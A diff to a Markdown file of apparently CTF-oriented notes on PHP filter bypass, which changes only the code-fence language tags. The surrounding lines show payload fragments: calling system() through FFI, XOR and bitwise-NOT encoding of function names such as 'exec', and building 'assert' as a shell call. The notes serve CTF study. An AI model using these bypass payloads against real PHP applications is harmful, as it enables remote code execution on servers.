@@ -94,7 +94,7 @@ Cause the -F and -x parameters to escape single quotes, causing arbitrary file r
 This is the one that I personally hate the most because it is purely bruteforce function.
 This time, some function and class will allow you to execute, in this scenario try some of the following for php:
 
-```
+```php
 <?php 
   $ffi=FFI::cdef("int system(const char *command);");
   $ffi->system('ls');
@@ -138,7 +138,7 @@ This time the code on 02. The method of identify would be star. Identify what ch
 This time real bypass, the easiest way is using XOR of PHP
 
 Using the code bellow and identify what you want:
-```
+```php
 <?php
 for($i=128;$i<255;$i++){
 	echo sprintf("%s^%s",urlencode(chr($i)),urlencode(chr(255)))."=>". (chr($i)^chr(255))."\n";
@@ -147,7 +147,7 @@ for($i=128;$i<255;$i++){
 ```
 And the code bellow for flash person in CTF (not entirely my code of course)
 
-```
+```php
 <?php
 $shell = "assert";
 $result1 = "";
@@ -210,7 +210,7 @@ Using reverse bytes to inject. The negative sign is ~, It's also an operator. In
 
 Reverse the string then reverse again in the payload. 
 
-```
+```php
 <?php 
 $a = urlencode(~'exec'); 
 echo $a; 
